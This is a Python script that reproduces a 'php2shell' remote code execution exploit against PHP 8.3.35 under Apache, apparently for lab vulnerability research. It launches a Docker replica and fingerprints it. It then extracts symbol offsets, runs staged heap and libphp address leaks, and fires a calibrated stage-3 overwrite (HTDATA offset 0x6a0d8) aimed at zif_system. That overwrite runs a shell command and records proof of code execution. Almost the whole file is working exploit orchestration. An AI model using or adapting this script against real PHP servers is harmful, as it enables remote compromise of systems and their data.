#!/usr/bin/env python3
"""Clean end-to-end PHP 8.3.35 php2shell reproduction.

Fresh container -> fingerprint -> symbols -> stage-1 heap leak -> stage-2
libphp leak -> single aimed stage-3 (HTDATA = chunk + 0x6a0d8, measured via
gdb crash forensics) -> command execution proof. Teardown on exit.
"""
from __future__ import annotations

import json
import os
import sys
import time

LAB = os.path.dirname(os.path.abspath(__file__))
DEV = os.path.join(LAB, "devploit-php2shell")
VENDOR = os.path.join(DEV, "vendor", "php2shell-upstream")
sys.path.insert(0, os.path.join(DEV, "tools"))

import php2shell_calibrate as C  # noqa: E402
import php2shell_matrix as M  # noqa: E402

IMAGE = "php:8.3.35-apache"
PORT = 8095
NAME = "p2s-repro-8335"
PROFILE = os.path.join(LAB, "profiles-ours", "8.3.35-bookworm-amd64.json")
HTDATA_OFF = 0x6A0D8
CARRIER_LEN = 15


def main() -> int:
    with open(PROFILE, encoding="utf-8") as fh:
        st = json.load(fh)["stages"]
    hints = {"stage1_n": st.get("stage1_n"), "stage1_len": st.get("stage1_forge_len"),
             "stage2_t": st.get("stage2_t"), "stage2_v": st.get("stage2_v", 16)}

    M.docker("rm", "-f", NAME)
    outdir = M.prepare_lab_out(os.path.join(M.LAB, "out", NAME))
    M.docker(
        "run", "-d", "--name", NAME,
        "-p", f"127.0.0.1:{PORT}:80",
        "-v", f"{M.LAB}/webroot:/var/www/html:ro",
        "-v", f"{M.LAB}/php.ini:/usr/local/etc/php/conf.d/zz-matrix.ini:ro",
        "-v", f"{M.LAB}/apache.conf:/etc/apache2/conf-enabled/zz-matrix.conf:ro",
        "-v", f"{outdir}:/out",
        IMAGE, timeout=900,
    )
    url = f"http://127.0.0.1:{PORT}/index.php"
    if not M.wait_http(url):
        raise SystemExit("replica did not answer")
    proof = os.path.join(outdir, "p1")
    if os.path.exists(proof):
        os.unlink(proof)
    try:
        version, server, powered = C.fingerprint(url)
        print(f"[*] target {url}: PHP {version or '?'} / {server}")

        sym = C.extract_symbols(VENDOR, NAME)
        mod = C.load_upstream(VENDOR)
        t = mod.Target(url, verbose=False)
        ex = mod.Exploit(t, "id>/out/p1", zif_offset=sym["zif_system"],
                         dtor_offset=sym["zval_ptr_dtor"], profile="bookworm",
                         verbose=False)

        chunk, n, flen = C.calibrate_stage1(mod, ex, hints)
        if not chunk:
            print("[!] stage-1 failed")
            return 2
        lib, tidx = C.calibrate_stage2(mod, ex, sym["zval_ptr_dtor"], hints)
        if not lib:
            print("[!] stage-2 failed")
            return 2
        print(f"[*] chunk={hex(chunk)} libphp={hex(lib)}")

        os.environ["P2S_CARRIER_LEN"] = str(CARRIER_LEN)
        ex.stage3_carrier = True
        ex.stage3_pads = [(31, 31)] * 6
        t0 = time.time()
        ex.rotate()
        ex.stage3(chunk + HTDATA_OFF, lib + sym["zif_system"])
        print(f"[*] stage-3 fired in {time.time() - t0:.1f}s")

        ok = os.path.exists(proof) and os.path.getsize(proof) > 0
        if ok:
            out = open(proof).read().strip()
            print(f"[+] RCE CONFIRMED on PHP {version}: {out}")
            rec = {"image": IMAGE, "htdata": hex(HTDATA_OFF),
                   "carrier_len": CARRIER_LEN, "chunk": hex(chunk),
                   "libphp": hex(lib), "proof": out, "source": "clean-repro"}
            with open(os.path.join(LAB, "logs", "repro-8.3.35-rce.json"), "w",
                      encoding="utf-8") as fh:
                json.dump(rec, fh, indent=2)
            return 0
        print("[-] no proof file")
        return 1
    finally:
        M.docker("rm", "-f", NAME)


if __name__ == "__main__":
    sys.exit(main())
